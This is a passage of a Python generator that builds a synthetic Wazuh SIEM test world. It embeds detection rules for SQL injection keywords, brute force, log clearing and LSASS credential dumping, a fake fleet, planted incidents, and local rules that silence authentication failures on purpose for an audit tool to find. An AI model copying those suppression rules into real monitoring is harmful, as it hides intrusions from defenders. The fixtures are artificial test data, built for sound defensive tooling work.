    <group>authentication_failures,gdpr_IV_35.7.d,gdpr_IV_32.2,hipaa_164.312.b,nist_800_53_SI.4,nist_800_53_AU.14,nist_800_53_AC.7,pci_dss_11.4,pci_dss_10.2.4,pci_dss_10.2.5,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>
  </rule>
  <rule id="5715" level="3">
    <if_sid>5700</if_sid>
    <match>^Accepted|authenticated.$</match>
    <description>sshd: authentication success.</description>
    <mitre>
      <id>T1078</id>
      <id>T1021</id>
    </mitre>
    <group>authentication_success,gdpr_IV_32.2,gpg13_7.1,gpg13_7.2,hipaa_164.312.b,nist_800_53_AU.14,nist_800_53_AC.7,pci_dss_10.2.5,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>
  </rule>
  <rule id="5716" level="5">
    <if_sid>5700</if_sid>
    <match>^Failed|^error: PAM: Authentication</match>
    <description>sshd: authentication failed.</description>
    <mitre>
      <id>T1110.001</id>
      <id>T1021.004</id>
    </mitre>
    <group>authentication_failed,gdpr_IV_35.7.d,gdpr_IV_32.2,gpg13_7.1,hipaa_164.312.b,nist_800_53_AU.14,nist_800_53_AC.7,nist_800_53_AU.6,pci_dss_10.2.4,pci_dss_10.2.5,pci_dss_10.6.1,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>
  </rule>
  <rule id="5720" level="10" frequency="8" timeframe="120" ignore="60">
    <if_matched_sid>5716</if_matched_sid>
    <same_srcip />
    <description>sshd: Multiple authentication failures.</description>
    <mitre>
      <id>T1110</id>
    </mitre>
    <group>authentication_failures,gdpr_IV_35.7.d,gdpr_IV_32.2,hipaa_164.312.b,nist_800_53_SI.4,nist_800_53_AU.14,nist_800_53_AC.7,pci_dss_11.4,pci_dss_10.2.4,pci_dss_10.2.5,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>
  </rule>
</group>
""",
    "0245-web_rules.xml": r"""
<group name="web,accesslog,">
  <rule id="31100" level="0">
    <decoded_as>web-accesslog</decoded_as>
    <description>Access log messages grouped.</description>
  </rule>
  <rule id="31101" level="5">
    <if_sid>31100</if_sid>
    <id>^4</id>
    <description>Web server 400 error code.</description>
    <group>attack,gdpr_IV_35.7.d,nist_800_53_SA.11,nist_800_53_SI.4,pci_dss_6.5,pci_dss_11.4,tsc_CC6.6,tsc_CC7.1,tsc_CC8.1,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>
  </rule>
  <rule id="31103" level="7">
    <if_sid>31100</if_sid>
    <url>=select%20|select+|%20from%20|union%20|union+|null,null|xp_cmdshell</url>
    <description>SQL injection attempt.</description>
    <mitre>
      <id>T1190</id>
    </mitre>
    <group>attack,sql_injection,gdpr_IV_35.7.d,nist_800_53_SA.11,nist_800_53_SI.4,pci_dss_6.5,pci_dss_11.4,pci_dss_6.5.1,tsc_CC6.6,tsc_CC7.1,tsc_CC8.1,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>
  </rule>
  <rule id="31115" level="7" maxsize="2048">
    <if_sid>31100</if_sid>
    <description>URL too long. Higher than allowed on most browsers. Possible attack.</description>
    <mitre>
      <id>T1190</id>
    </mitre>
    <group>invalid_access,gdpr_IV_35.7.d,nist_800_53_SA.11,nist_800_53_SI.4,pci_dss_6.5,pci_dss_11.4,tsc_CC6.6,tsc_CC7.1,tsc_CC8.1,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>
  </rule>
  <rule id="31106" level="12">
    <if_sid>31103</if_sid>
    <id>^200</id>
    <description>A web attack returned code 200 (success).</description>
    <mitre>
      <id>T1190</id>
    </mitre>
    <group>attack,gdpr_IV_35.7.d,nist_800_53_SA.11,nist_800_53_SI.4,pci_dss_6.5,pci_dss_11.4,tsc_CC6.6,tsc_CC7.1,tsc_CC8.1,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>
  </rule>
  <rule id="31151" level="10" frequency="14" timeframe="90" ignore="120">
    <if_matched_sid>31101</if_matched_sid>
    <same_srcip />
    <description>Multiple web server 400 error codes from same source ip.</description>
    <mitre>
      <id>T1595.002</id>
    </mitre>
    <group>web_scan,recon,gdpr_IV_35.7.d,nist_800_53_SI.4,pci_dss_6.5,pci_dss_11.4,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>
  </rule>
</group>
""",
    "0535-sca_rules.xml": r"""
<group name="sca,">
  <rule id="19000" level="0">
    <decoded_as>sca</decoded_as>
    <description>SCA rules grouped.</description>
  </rule>
  <rule id="19004" level="7">
    <if_sid>19000</if_sid>
    <field name="sca.type">^summary$</field>
    <field name="sca.score" type="pcre2">^[0-4]?[0-9]$</field>
    <description>SCA summary: $(sca.policy): Score less than 50% ($(sca.score))</description>
  </rule>
</group>
""",
    "0580-win-security_rules.xml": r"""
<var name="MS_FREQ">8</var>

<group name="windows,">
  <rule id="60000" level="0">
    <decoded_as>windows_eventchannel</decoded_as>
    <field name="win.system.providerName">\.+</field>
    <options>no_full_log</options>
    <description>Group of windows rules.</description>
  </rule>
</group>

<group name="windows,windows_security,">
  <rule id="60001" level="0">
    <if_sid>60000</if_sid>
    <field name="win.system.channel">^Security$</field>
    <options>no_full_log</options>
    <description>Group of Windows Security channel rules.</description>
  </rule>
  <rule id="60103" level="0">
    <if_sid>60001</if_sid>
    <field name="win.system.severityValue">^AUDIT_SUCCESS$</field>
    <options>no_full_log</options>
    <description>Windows audit success event.</description>
  </rule>
  <rule id="60105" level="0">
    <if_sid>60001</if_sid>
    <field name="win.system.severityValue">^AUDIT_FAILURE$</field>
    <options>no_full_log</options>
    <description>Windows audit failure event.</description>
  </rule>
  <rule id="60106" level="3">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^528$|^540$|^673$|^4624$|^4769$</field>
    <options>no_full_log</options>
    <description>Windows Logon Success</description>
    <mitre>
      <id>T1078</id>
    </mitre>
    <group>authentication_success,gdpr_IV_32.2,gpg13_7.1,gpg13_7.2,hipaa_164.312.b,nist_800_53_AU.14,nist_800_53_AC.9,pci_dss_10.2.5,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>
  </rule>
  <rule id="60122" level="5">
    <if_sid>60105</if_sid>
    <field name="win.system.eventID">^529$|^4625$</field>
    <options>no_full_log</options>
    <description>Logon Failure - Unknown user or bad password</description>
    <mitre>
      <id>T1110</id>
    </mitre>
    <group>authentication_failed,gdpr_IV_35.7.d,gdpr_IV_32.2,gpg13_7.1,hipaa_164.312.b,nist_800_53_AU.14,nist_800_53_AC.7,nist_800_53_AU.6,pci_dss_10.2.4,pci_dss_10.2.5,pci_dss_10.6.1,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>
  </rule>
  <!-- Correlation on the authentication_failed group: 8 failures from one address within 4 minutes. -->
  <rule id="60204" level="10" frequency="$MS_FREQ" timeframe="240">
    <if_matched_group>authentication_failed</if_matched_group>
    <same_field>win.eventdata.ipAddress</same_field>
    <options>no_full_log</options>
    <description>Multiple Windows Logon Failures</description>
    <mitre>
      <id>T1110</id>
    </mitre>
    <group>authentication_failures,gdpr_IV_35.7.d,gdpr_IV_32.2,hipaa_164.312.b,nist_800_53_SI.4,nist_800_53_AU.14,nist_800_53_AC.7,pci_dss_11.4,pci_dss_10.2.4,pci_dss_10.2.5,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>
  </rule>
  <rule id="63103" level="12">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^1102$</field>
    <options>no_full_log</options>
    <description>The audit log was cleared.</description>
    <mitre>
      <id>T1070.001</id>
    </mitre>
    <group>log_clearing,</group>
  </rule>
  <rule id="67027" level="3">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4688$</field>
    <options>no_full_log</options>
    <description>A new process has been created.</description>
    <group>process_creation,</group>
  </rule>
</group>
""",
    "0585-win-system_rules.xml": r"""
<group name="windows,windows_system,">
  <rule id="61100" level="0">
    <if_sid>60000</if_sid>
    <field name="win.system.channel">^System$</field>
    <options>no_full_log</options>
    <description>Group of Windows System channel rules.</description>
  </rule>
  <rule id="61104" level="3">
    <if_sid>61100</if_sid>
    <field name="win.system.eventID">^7040$</field>
    <options>no_full_log</options>
    <description>Service startup type was changed.</description>
    <group>policy_changed,</group>
  </rule>
  <rule id="61138" level="5">
    <if_sid>61100</if_sid>
    <field name="win.system.eventID">^7045$</field>
    <options>no_full_log</options>
    <description>New Windows Service Created.</description>
    <mitre>
      <id>T1543.003</id>
    </mitre>
    <group>service_installed,</group>
  </rule>
</group>
""",
    "0595-win-sysmon_rules.xml": r"""
<group name="windows,sysmon,">
  <rule id="61600" level="0">
    <if_sid>60000</if_sid>
    <field name="win.system.channel">^Microsoft-Windows-Sysmon/Operational$</field>
    <options>no_full_log</options>
    <description>Sysmon events grouped.</description>
  </rule>
  <rule id="61603" level="0">
    <if_sid>61600</if_sid>
    <field name="win.system.eventID">^1$</field>
    <options>no_full_log</options>
    <description>Sysmon - Event 1: Process creation</description>
    <group>sysmon_event1,</group>
  </rule>
  <rule id="61605" level="0">
    <if_sid>61600</if_sid>
    <field name="win.system.eventID">^3$</field>
    <options>no_full_log</options>
    <description>Sysmon - Event 3: Network connection</description>
    <group>sysmon_event3,</group>
  </rule>
  <rule id="61612" level="0">
    <if_sid>61600</if_sid>
    <field name="win.system.eventID">^10$</field>
    <options>no_full_log</options>
    <description>Sysmon - Event 10: Process accessed</description>
    <group>sysmon_event_10,</group>
  </rule>
  <rule id="92001" level="4">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)\\(powershell|pwsh|cmd)\.exe$</field>
    <options>no_full_log</options>
    <description>Sysmon - Event 1: Scripting interpreter started (PowerShell or cmd)</description>
    <mitre>
      <id>T1059.001</id>
    </mitre>
    <group>sysmon_process_creation,</group>
  </rule>
  <rule id="92150" level="5">
    <if_group>sysmon_event3</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)\\+Users\\+[^\\]+\\+AppData\\+</field>
    <options>no_full_log</options>
    <description>Sysmon - Event 3: Network connection from an executable in a user-writable folder</description>
    <mitre>
      <id>T1071</id>
    </mitre>
    <group>sysmon_network,</group>
  </rule>
  <rule id="92601" level="12">
    <if_group>sysmon_event_10</if_group>
    <field name="win.eventdata.targetImage" type="pcre2">(?i)\\+lsass\.exe$</field>
    <options>no_full_log</options>
    <description>Sysmon - Event 10: Possible credential dumping, LSASS process memory accessed</description>
    <mitre>
      <id>T1003.001</id>
    </mitre>
    <group>credential_dumping,</group>
  </rule>
</group>
""",
    _LOCAL_RULES: r"""
<!-- Local rules of the demo tenant (/var/ossec/etc/rules/local_rules.xml): the tuning debt 'hushwatch audit'
     is meant to find. -->

<group name="local,syslog,sshd,">
  <!-- OPS-1182: the jump host generated too many failed logins. -->
  <rule id="100010" level="0">
    <if_sid>5716</if_sid>
    <description>Ignore sshd authentication failures</description>
  </rule>
  <!-- OPS-1240: the vulnerability scanner uses test accounts. -->
  <rule id="100011" level="0">
    <if_sid>5710</if_sid>
    <user>test</user>
    <description>Ignore invalid-user attempts for test accounts</description>
  </rule>
</group>

<group name="local,windows,">
  <!-- OPS-1311: service accounts with rotated passwords. -->
  <rule id="100020" level="0">
    <if_sid>60122</if_sid>
    <field name="win.eventdata.targetUserName">svc_</field>
    <description>Ignore logon failures of service accounts</description>
  </rule>
  <!-- CHG-0412: temporary demotion during the legacy application migration. -->
  <rule id="100030" level="3">
    <if_sid>60106</if_sid>
    <location type="pcre2">^\(srv\x{2d}app\x{2d}02\) </location>
    <field name="win.eventdata.targetUserName" type="pcre2">^svc_legacy$</field>
    <description>Demote svc_legacy logons on srv-app-02 (CHG-0412, expires @EXPIRED@)</description>
    <group>windows,windows_security,authentication_success,local_tuned,</group>
  </rule>
  <!-- CHG-0977: deployment account, reviewed every quarter. -->
  <rule id="100040" level="3">
    <if_sid>60106</if_sid>
    <location type="pcre2">^\(srv\x{2d}app\x{2d}03\) </location>
    <field name="win.eventdata.targetUserName" type="pcre2">^svc_deploy$</field>
    <description>Demote svc_deploy logons on srv-app-03 (CHG-0977, expires @CURRENT@)</description>
    <group>windows,windows_security,authentication_success,local_tuned,</group>
  </rule>
</group>
""",
}

_Body = tuple[tuple[str, tuple[tuple[str, str], ...], str], ...]


@dataclass(frozen=True, slots=True)
class _Rule:
    id: str
    level: int
    description: str
    file: str
    parent_groups: str  # the enclosing <group name="...">
    groups: str  # the rule's own <group> text (compliance prefixes included, like the real files)
    body: _Body  # every other child element: (tag, sorted attributes, text)
    mitre: tuple[str, ...]
    attrs: tuple[tuple[str, str], ...]  # frequency / timeframe / ignore as written (may reference a <var>)
    variables: tuple[tuple[str, str], ...]  # the file's <var> definitions

    def attr_int(self, name: str, default: int) -> int:
        raw = dict(self.attrs).get(name)
        if raw is None:
            return default
        if raw.startswith("$"):
            raw = dict(self.variables)[raw[1:]]
        return int(raw)


def _rule_texts(now: datetime) -> dict[str, str]:
    """The rule files; local-rule expiry dates are relative to ``now`` (one past, one in the future)."""
    texts = dict(_RULE_FILES)
    texts[_LOCAL_RULES] = (
        texts[_LOCAL_RULES]
        .replace("@EXPIRED@", (now - timedelta(days=86)).date().isoformat())
        .replace("@CURRENT@", (now + timedelta(days=188)).date().isoformat())
    )
    return texts


def _parse_rules(texts: Mapping[str, str]) -> tuple[_Rule, ...]:
    """Parse the rule files the way a ruleset loader would (several top-level elements: wrap in a root)."""
    rules: list[_Rule] = []
    for name in sorted(texts):
        # The texts are this module's own constants, never external input.
        root = ET.fromstring(f"<root>{texts[name]}</root>")  # noqa: S314
        variables = tuple((str(v.get("name")), (v.text or "").strip()) for v in root.findall("var"))
        for group in root.findall("group"):
            for element in group.findall("rule"):
                body = tuple(
                    (child.tag, tuple(sorted(child.attrib.items())), (child.text or "").strip())
                    for child in element
                    if child.tag not in ("description", "mitre", "options", "group")
                )
                rules.append(
                    _Rule(
                        id=str(element.get("id")),
                        level=int(str(element.get("level"))),
                        description=(element.findtext("description") or "").strip(),
                        file=name,
                        parent_groups=str(group.get("name", "")),
                        groups="".join((g.text or "").strip() for g in element.findall("group")),
                        body=body,
                        mitre=tuple((i.text or "").strip() for i in element.findall("mitre/id")),
                        attrs=tuple((k, v) for k, v in element.attrib.items() if k not in ("id", "level")),
                        variables=variables,
                    )
                )
    return tuple(rules)


def _write_rules(rules_dir: Path, texts: Mapping[str, str]) -> None:
    rules_dir.mkdir(parents=True, exist_ok=True)
    for name in sorted(texts):
        (rules_dir / name).write_text(_SYNTHETIC_HEADER + texts[name], encoding="utf-8")


class _AlertRule(NamedTuple):
    id: str
    level: int
    head: dict[str, Any]  # level, description, id, [mitre], [frequency]  (serializer order)
    tail: dict[str, Any]  # mail, groups, compliance arrays


def _alert_rules(rules: Sequence[_Rule]) -> dict[str, _AlertRule]:
    """The ``rule`` object of the alerts of every rule that can alert (level >= 1, not local tuning)."""
    out: dict[str, _AlertRule] = {}
    for rule in rules:
        if rule.level == 0 or rule.file == _LOCAL_RULES:
            continue
        head: dict[str, Any] = {"level": rule.level, "description": rule.description, "id": rule.id}
        if rule.mitre:
            tactics: list[str] = []
            for technique in rule.mitre:
                for tactic in _MITRE[technique][0]:
                    if tactic not in tactics:
                        tactics.append(tactic)
            head["mitre"] = {
                "id": list(rule.mitre),
                "tactic": tactics,
                "technique": [_MITRE[t][1] for t in rule.mitre],
            }
        if dict(rule.attrs).get("frequency"):
            head["frequency"] = rule.attr_int("frequency", 0)
        groups: list[str] = []
        compliance: dict[str, list[str]] = {}
        for name in (rule.parent_groups + rule.groups).split(","):
            name = name.strip()
            if not name:
                continue
            for prefix, key in _COMPLIANCE:
                if name.startswith(prefix):
                    compliance.setdefault(key, []).append(name[len(prefix) :])
                    break
            else:
                if name not in groups:
                    groups.append(name)
        tail: dict[str, Any] = {"mail": rule.level >= 12, "groups": groups}
        for _prefix, key in _COMPLIANCE:
            if key in compliance:
                tail[key] = compliance[key]
        out[rule.id] = _AlertRule(rule.id, rule.level, head, tail)
    return out


# ---- the synthetic world: fleet, clock, schedules ---------------------------------------------------------------

_DOMAIN = "CORP"
_DNS = "corp.example"
_DOMAIN_SID = "S-1-5-21-1111111111-2222222222-3333333333"
_PEOPLE = (
    "alice",
    "bob",
    "carol",
    "dave",
    "erin",
    "frank",
    "grace",
    "heidi",
    "ivan",
    "judy",
    "kevin",
    "laura",
    "mike",
    "nina",
    "oscar",
    "peggy",
    "quinn",
    "rupert",
    "sybil",
    "trent",
    "ursula",
    "victor",
    "wendy",
    "xavier",
)
_ADMINS = ("alice", "bob", "carol", "dave")
_SEC_GUID = "{54849625-5478-4994-a5ba-3e3b0328c30d}"
_SYSMON_GUID = "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
_EVENTLOG_GUID = "{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}"
_SCM_GUID = "{555908d1-a6d7-4695-8e1e-26931d2012f4}"
_SYSMON_CHANNEL = "Microsoft-Windows-Sysmon/Operational"


@dataclass(frozen=True, slots=True)
class _Agent:
    id: str
    name: str
    ip: str | None
    role: str  # manager | dc | web | db | backup | app | laptop | legacy | mon | new
    platform: str  # os.platform as the Wazuh API reports it: windows | ubuntu | rhel
    os_name: str
    os_version: str
    groups: tuple[str, ...]
    owner: str | None = None  # laptop user
    version: str = "Wazuh v4.14.8"

    @property
    def windows(self) -> bool:
        return self.platform == "windows"

    @property
    def auth_log(self) -> str:
        return "/var/log/secure" if self.platform == "rhel" else "/var/log/auth.log"

    def alert_obj(self) -> dict[str, str]:
        obj = {"id": self.id, "name": self.name}
        if self.ip:
            obj["ip"] = self.ip
        return obj


def _fleet(n_laptops: int) -> list[_Agent]:
    win22 = ("Microsoft Windows Server 2022 Datacenter", "10.0.20348.2700")
    win19 = ("Microsoft Windows Server 2019 Standard", "10.0.17763.6293")
    ubuntu = ("Ubuntu", "24.04.1 LTS (Noble Numbat)")
    rhel = ("Red Hat Enterprise Linux", "9.4 (Plow)")
    fleet = [_Agent("000", MANAGER_NAME, None, "manager", "ubuntu", *ubuntu, ())]

    def add(
        name: str,
        ip: str | None,
        role: str,
        platform: str,
        os: tuple[str, str],
        groups: tuple[str, ...],
        owner: str | None = None,
        version: str = "Wazuh v4.14.8",
    ) -> None:
        fleet.append(_Agent(f"{len(fleet):03d}", name, ip, role, platform, os[0], os[1], groups, owner, version))

    add("dc01", "10.10.10.11", "dc", "windows", win22, ("default", "windows", "domain-controllers"))
    add("dc02", "10.10.10.12", "dc", "windows", win22, ("default", "windows", "domain-controllers"))
    for i in range(1, 7):
        add(f"srv-web-{i:02d}", f"10.10.1.{20 + i}", "web", "ubuntu", ubuntu, ("default", "linux", "web"))
    for i in range(1, 4):
        add(f"srv-db-{i:02d}", f"10.10.2.{30 + i}", "db", "rhel", rhel, ("default", "linux", "database"))
    add("srv-backup-01", "10.10.3.41", "backup", "windows", win19, ("default", "windows", "servers"))
    for i in range(1, 4):
        add(
            f"srv-app-{i:02d}",
            f"10.10.3.{50 + i}",
            "app",
            "windows",
            win22,
            ("default", "windows", "servers"),
            version="Wazuh v4.12.0" if i == 3 else "Wazuh v4.14.8",
        )
    for i in range(1, n_laptops + 1):
        owner = _PEOPLE[(i - 1) % len(_PEOPLE)] + ("" if i <= len(_PEOPLE) else str((i - 1) // len(_PEOPLE)))
        add(
            f"lap-{i:03d}",
            f"10.40.1.{100 + i}" if i <= 150 else f"10.40.{2 + (i - 151) // 200}.{20 + (i - 151) % 200}",
            "laptop",
            "windows",
            ("Microsoft Windows 11 Pro", "10.0.22631.4169"),
            ("default", "windows", "laptops"),
            owner,
        )
    add(
        "srv-legacy-01",
        "10.10.1.90",
        "legacy",
        "ubuntu",
        ("Ubuntu", "20.04.6 LTS (Focal Fossa)"),
        ("default", "linux"),
        version="Wazuh v4.7.5",
    )
    add("srv-new-01", None, "new", "rhel", rhel, ("default",))
    add("srv-mon-01", "10.10.4.20", "mon", "ubuntu", ubuntu, ("default", "linux"))
    return fleet


class _HourInfo(NamedTuple):
    local_hour: int
    weekday: int
    local_date: date
    off_day: bool  # weekend or calendar holiday


class _World:
    """Everything the streams share: parameters, clock, fleet, schedules and the planted timeline."""

    def __init__(self, *, seed: int, days: int, now: datetime, n_laptops: int, scale: float) -> None:
        self.seed = seed
        self.days = days
        self.scale = scale
        self.tz = ZoneInfo(TIMEZONE)
        self.now = now
        self.start = now - timedelta(days=days)
        self.now_ms = _ms(now)
        self.start_ms = _ms(self.start)
        self.grid_ms = self.start_ms - self.start_ms % _HOUR_MS
        self.hours = -(-(self.now_ms - self.grid_ms) // _HOUR_MS)
        local_now = now.astimezone(self.tz).date()
        holiday = local_now - timedelta(days=9)
        while holiday.weekday() >= 5:
            holiday -= timedelta(days=1)
        self.holiday = holiday
        self.info: list[_HourInfo] = []
        for h in range(self.hours + 1):
            local = datetime.fromtimestamp((self.grid_ms + h * _HOUR_MS) // 1000, tz=UTC).astimezone(self.tz)
            self.info.append(
                _HourInfo(local.hour, local.weekday(), local.date(), local.weekday() >= 5 or local.date() == holiday)
            )
        self.fleet = _fleet(n_laptops)
        self.by_name = {a.name: a for a in self.fleet}
        self.manager = self.fleet[0]
        # planted timeline (all relative to now)
        self.dc02_silence_ms = self.now_ms - 30 * _HOUR_MS
        self.clear_log_ms = self.dc02_silence_ms - 20 * 60_000
        self.sysmon_stop_ms = self.now_ms - 48 * _HOUR_MS
        upgrade = (now - timedelta(days=4)).astimezone(self.tz).replace(hour=3, minute=12, second=0, microsecond=0)
        self.fw_upgrade_ms = _ms(upgrade.astimezone(UTC))
        self.sca_stop_ms = self.now_ms - 7 * _DAY_MS
        pam_update = (now - timedelta(days=3)).astimezone(self.tz).replace(hour=6, minute=25, second=0, microsecond=0)
        self.pam_change_ms = _ms(pam_update.astimezone(UTC))
        self.legacy_stop_ms = self.now_ms - 5 * _DAY_MS - 37 * 60_000
        self.brute_start_ms = self.now_ms - 46 * _HOUR_MS
        self.spray_start_ms = self.now_ms - 72 * _HOUR_MS + 25 * 60_000
        self.beacon_start_ms = self.now_ms - 6 * _DAY_MS
        rng = _stream_rng(seed, "laptop-schedules")
        self.schedules: dict[str, dict[date, tuple[int, int]]] = {}
        dates = sorted({i.local_date for i in self.info})
        for agent in self.fleet:
            if agent.role != "laptop":
                continue
            plan: dict[date, tuple[int, int]] = {}
            for day in dates:
                on_minute = 7 * 60 + 45 + rng.randrange(0, 76)
                off_minute = 17 * 60 + 15 + rng.randrange(0, 106)
                if day.weekday() >= 5 or day == holiday:
                    continue
                midnight = datetime(day.year, day.month, day.day, tzinfo=self.tz)
                plan[day] = (
                    _ms(midnight + timedelta(minutes=on_minute)) + rng.randrange(60_000),
                    _ms(midnight + timedelta(minutes=off_minute)) + rng.randrange(60_000),
                )
            self.schedules[agent.name] = plan

    # -- seasonal shapes (multipliers of a base hourly rate) --
    def diurnal(self, h: int) -> float:
        info = self.info[h]
        base = _DIURNAL[info.local_hour]
        return base * (0.45 if info.off_day else 1.0)

    def business(self, h: int) -> float:
        info = self.info[h]
        if info.off_day:
            return 0.03
        return _BUSINESS[info.local_hour]

    def on_intervals(self, laptop: str, t0: int, t1: int) -> list[tuple[int, int]]:
        """Parts of [t0, t1) during which ``laptop`` is powered on."""
        plan = self.schedules.get(laptop, {})
        out = []
        for day in {self.info_at(t0).local_date, self.info_at(t1 - 1).local_date}:
            span = plan.get(day)
            if span and span[0] < t1 and span[1] > t0:
                out.append((max(span[0], t0), min(span[1], t1)))
        return sorted(out)

    def info_at(self, ms: int) -> _HourInfo:
        return self.info[min(max((ms - self.grid_ms) // _HOUR_MS, 0), self.hours)]


_DIURNAL = (
    0.35,
    0.3,
    0.3,
    0.3,
    0.35,
    0.4,
    0.55,
    0.8,
    1.3,
    1.5,
    1.5,
    1.45,
    1.2,
    1.35,
    1.5,
    1.5,
    1.4,
    1.2,
    0.95,
    0.75,
    0.6,
    0.5,
    0.45,
    0.4,
)
_BUSINESS = (
    0.03,
    0.03,
    0.03,
    0.03,
    0.03,
    0.03,
    0.05,
    0.2,
    0.7,
    1.0,
    1.0,
    1.0,
    0.8,
    1.0,
    1.0,
    1.0,
    1.0,
    0.8,
    0.5,
    0.2,
    0.08,
    0.05,
    0.03,
    0.03,
)


# ---- alert body builders (everything after "id" in the serializer order) ------------------------------------------


def _syslog_body(
    host: str,
    ms: int,
    rng: random.Random,
    program: str,
    pid: int | None,
    message: str,
    location: str,
    decoder: dict[str, str],
    data: dict[str, Any] | None,
) -> dict[str, Any]:
    stamp = _syslog_ts(ms - rng.randrange(40, 1500))
    tag = f"{program}[{pid}]" if pid is not None else program
    body: dict[str, Any] = {
        "full_log": f"{stamp} {host} {tag}: {message}",
        "predecoder": {"program_name": program, "timestamp": stamp, "hostname": host},
        "decoder": decoder,
    }
    if data:
        body["data"] = data
    body["location"] = location
    return body


def _sshd_invalid(agent: _Agent, ms: int, rng: random.Random, user: str, ip: str) -> dict[str, Any]:
    port = str(rng.randrange(32768, 61000))
    return _syslog_body(
        agent.name,
        ms,
        rng,
        "sshd",
        rng.randrange(1200, 65000),
        f"Invalid user {user} from {ip} port {port}",
        agent.auth_log,
        {"parent": "sshd", "name": "sshd"},
        {"srcip": ip, "srcport": port, "srcuser": user},
    )


def _sshd_accepted(agent: _Agent, ms: int, rng: random.Random, user: str, ip: str) -> dict[str, Any]:
    port = str(rng.randrange(32768, 61000))
    fingerprint = "".join(
        rng.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/") for _ in range(43)
    )
    return _syslog_body(
        agent.name,
        ms,
        rng,
        "sshd",
        rng.randrange(1200, 65000),
        f"Accepted publickey for {user} from {ip} port {port} ssh2: ED25519 SHA256:{fingerprint}",
        agent.auth_log,
        {"parent": "sshd", "name": "sshd"},
        {"srcip": ip, "srcport": port, "dstuser": user},
    )


def _pam(agent: _Agent, ms: int, rng: random.Random, pid: int, opened: bool) -> dict[str, Any]:
    if opened:
        message = "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)"
        data = {"dstuser": "root", "uid": "0"}
    else:
        message = "pam_unix(cron:session): session closed for user root"
        data = {"dstuser": "root"}
    return _syslog_body(
        agent.name, ms, rng, "CRON", pid, message, agent.auth_log, {"parent": "pam", "name": "pam"}, data
    )


_SUDO_COMMANDS = {
    "web": (
        "/usr/bin/systemctl reload nginx",
        "/usr/bin/tail -n 200 /var/log/nginx/error.log",
        "/usr/bin/apt-get update",
    ),
    "db": ("/usr/bin/systemctl status postgresql", "/usr/bin/du -sh /var/lib/pgsql", "/usr/bin/dnf check-update"),
}


def _sudo(agent: _Agent, ms: int, rng: random.Random, user: str) -> dict[str, Any]:
    command = rng.choice(_SUDO_COMMANDS.get(agent.role, ("/usr/bin/systemctl restart wazuh-agent", "/usr/bin/id")))
    pwd = f"/home/{user}"
    message = f"   {user} : TTY=pts/{rng.randrange(0, 4)} ; PWD={pwd} ; USER=root ; COMMAND={command}"
    data = {
        "srcuser": user,
        "dstuser": "root",
        "tty": message.split("TTY=")[1].split(" ;")[0],
        "pwd": pwd,
        "command": command,
    }
    return _syslog_body(
        agent.name, ms, rng, "sudo", None, message, agent.auth_log, {"parent": "sudo", "name": "sudo"}, data
    )


def _web(
    agent: _Agent, ms: int, ip: str, method: str, url: str, status: int, size: int, agent_str: str
) -> dict[str, Any]:
    t = time.gmtime(ms // 1000 - 1)
    stamp = (
        f"{t.tm_mday:02d}/{_MONTHS[t.tm_mon - 1]}/{t.tm_year:04d}:{t.tm_hour:02d}:{t.tm_min:02d}:{t.tm_sec:02d} +0000"
    )
    return {
        "full_log": f'{ip} - - [{stamp}] "{method} {url} HTTP/1.1" {status} {size} "-" "{agent_str}"',
        "decoder": {"name": "web-accesslog"},
        "data": {"protocol": method, "srcip": ip, "id": str(status), "url": url},
        "location": "/var/log/nginx/access.log",
    }


def _firewall(
    ms: int, rng: random.Random, src: str, dst: str, dport: int, proto: str, upgraded: bool
) -> dict[str, Any]:
    sport = str(rng.randrange(1024, 65535))
    if upgraded:  # new firmware renamed the key: the decoder no longer extracts the destination port
        message = (
            f"action=deny proto={proto} srcip={src} srcport={sport} dstip={dst} dst_port={dport} "
            f"iface=wan0 policy_id=12 fw=7.4.3"
        )
        data = {"protocol": proto, "action": "deny", "srcip": src, "srcport": sport, "dstip": dst}
    else:
        message = (
            f"action=deny proto={proto} srcip={src} srcport={sport} dstip={dst} dstport={dport} iface=wan0 policy=12"
        )
        data = {
            "protocol": proto,
            "action": "deny",
            "srcip": src,
            "srcport": sport,
            "dstip": dst,
            "dstport": str(dport),
        }
    return _syslog_body(
        "fw-edge-01", ms, rng, "edgefw", 1402, message, FIREWALL_IP, {"parent": "edgefw", "name": "edgefw"}, data
    )


class _FileState:
    __slots__ = ("inode", "md5", "mtime", "sha1", "sha256", "size")

    def __init__(self, rng: random.Random, ms: int) -> None:
        self.size = rng.randrange(20_000, 4_000_000)
        self.md5, self.sha1, self.sha256 = _hex(rng, 16), _hex(rng, 20), _hex(rng, 32)
        self.mtime = ms // 1000 - rng.randrange(60, 3600)
        self.inode = rng.randrange(100_000, 9_999_999)


def _fim(path: str, ms: int, rng: random.Random, state: _FileState, owner: str) -> dict[str, Any]:
    before = (state.size, state.md5, state.sha1, state.sha256, state.mtime)
    state.size += rng.randrange(200, 40_000)
    state.md5, state.sha1, state.sha256 = _hex(rng, 16), _hex(rng, 20), _hex(rng, 32)
    state.mtime = ms // 1000 - rng.randrange(0, 3)
    iso_before = time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(before[4]))
